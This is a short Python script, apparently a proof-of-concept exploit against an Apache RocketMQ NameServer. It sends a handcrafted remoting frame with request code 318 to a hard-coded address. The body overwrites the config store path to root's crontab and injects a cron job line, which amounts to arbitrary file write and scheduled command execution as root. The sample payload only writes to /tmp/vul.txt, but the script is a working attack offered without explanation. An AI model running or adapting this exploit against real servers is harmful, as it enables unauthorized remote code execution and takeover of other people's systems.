import socket
import binascii


client = socket.socket()
# you ip
client.connect(('192.168.26.160',9876))
# data
json = '{"code":318,"extFields":{"test":"RockedtMQ"},"flag":0,"language":"JAVA","opaque":266,"serializeTypeCurrentRPC":"JSON","version":433}'.encode('utf-8')
body='configStorePath=/var/spool/cron/root\nkvConfigPath=123\\n*/1 * * * * echo 1 > /tmp/vul.txt'.encode('utf-8')
json_lens = int(len(binascii.hexlify(json).decode('utf-8'))/2)
head1 = '00000000'+str(hex(json_lens))[2:]
all_lens = int(4+len(binascii.hexlify(body).decode('utf-8'))/2+json_lens)
head2 = '00000000'+str(hex(all_lens))[2:]
data = head2[-8:]+head1[-8:]+binascii.hexlify(json).decode('utf-8')+binascii.hexlify(body).decode('utf-8')
# send
client.send(bytes.fromhex(data))
data_recv = client.recv(1024)
print(data_recv)
